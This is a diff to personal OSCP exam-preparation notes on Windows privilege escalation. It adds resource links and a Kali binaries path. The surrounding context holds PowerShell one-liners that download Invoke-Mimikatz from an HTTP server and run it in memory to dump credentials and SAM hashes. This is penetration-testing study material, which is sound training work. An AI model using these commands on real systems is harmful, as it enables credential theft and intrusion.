@@ -71,11 +71,13 @@ description: Just some rough notes in preparation for the OSCP.
 ### Privilege Escalation - Windows
 
 * PowerShell Empire has some great PS1 scripts readily available such as `Invoke-Watson` and `Invoke-MS16032` as examples. Their `Mimikatz.ps1` is also great. These can be accessed at `/usr/share/powershell-empire/empire/server/data/module_source/`
+* Lots of people seem to forget that Windows binaries are readily available on Kali.&#x20;
+  * `/usr/share/windows-binaries`
 * Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
 * Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).
-* Here are some good guides on Windows Privilege Escalation
+* Here are some good resources for Windows Privilege Escalation
   * [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
   * [Juicy Potato Walkthrough](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
 
@@ -152,6 +154,7 @@ Best TTY upgrade:
 * [OSCP Enumeration Cheatsheet](https://strongcourage.github.io/2020/05/03/enum.html)
 * [iRedTeam Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
 * [Impacket Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+* [Amazing GitBook Reference](https://gitbook.brainyou.stream/basic-windows/tcm-win-privesc)
 
 ### References While Building my Notes
 
